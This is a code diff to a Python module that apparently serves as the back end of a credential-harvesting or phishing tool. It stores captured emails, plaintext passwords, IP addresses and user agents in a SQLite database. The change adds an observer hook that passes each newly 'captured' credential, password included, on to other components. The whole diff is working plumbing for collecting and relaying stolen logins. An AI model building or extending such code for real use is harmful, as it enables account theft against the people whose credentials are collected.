@@ -1,6 +1,9 @@
 import sqlite3
+from app.observers import credential_subject
 
-DB_NAME = "creds.db"
+import os
+
+DB_NAME = os.path.abspath(os.path.join(os.path.dirname(__file__), "../creds.db"))
 
 def init_db():
     with sqlite3.connect(DB_NAME) as conn:
@@ -26,3 +29,13 @@ def insert_credential(email, password, ip, user_agent, timestamp):
                 VALUES (?, ?, ?, ?, ?)
             ''', (email, password, ip, user_agent, timestamp))
             conn.commit()
+            
+            # Observer pattern: Notify that a new credential was captured
+            credential_dict = {
+                "email": email,
+                "password": password,
+                "ip": ip,
+                "user_agent": user_agent,
+                "timestamp": timestamp
+            }
+            credential_subject.notify(credential_dict)
